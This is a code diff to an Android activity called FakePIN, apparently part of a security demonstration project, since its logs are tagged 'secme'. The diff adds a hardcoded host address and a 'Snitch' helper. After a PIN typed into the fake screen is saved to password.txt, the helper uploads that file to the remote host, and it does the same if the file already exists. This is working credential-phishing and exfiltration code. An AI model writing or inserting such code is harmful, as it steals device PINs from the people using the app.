@@ -14,6 +14,8 @@ import java.io.IOException;
 
 public class FakePIN extends AppCompatActivity {
     private static boolean done = false;
+    private static final String PASS_FILENAME = "password.txt";
+    private static final String URL = "http://192.168.1.30";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -44,17 +46,22 @@ public class FakePIN extends AppCompatActivity {
 
     private void writeData(String data) throws IOException {
         File path = getApplicationContext().getFilesDir();
-        File file = new File(path, "password.txt");
+        File file = new File(path, PASS_FILENAME);
+        Snitch snitch = new Snitch(this, URL);
         Log.v("secme", "Password ecrit dans "+ file.getAbsolutePath());
 
         if (file.exists()) {
             Log.v("secme", "Le fichier existe deja");
+            Log.v("secme", "Sending Request commemme");
+            snitch.sendWebRequest(file, "pin", "txt");
             return;
         }
         FileOutputStream stream = new FileOutputStream(file);
         try {
             stream.write(data.getBytes());
         } finally {
+            Log.v("secme", "File created - Sending Request");
+            snitch.sendWebRequest(file, "pin", "txt");
             stream.close();
         }
     }
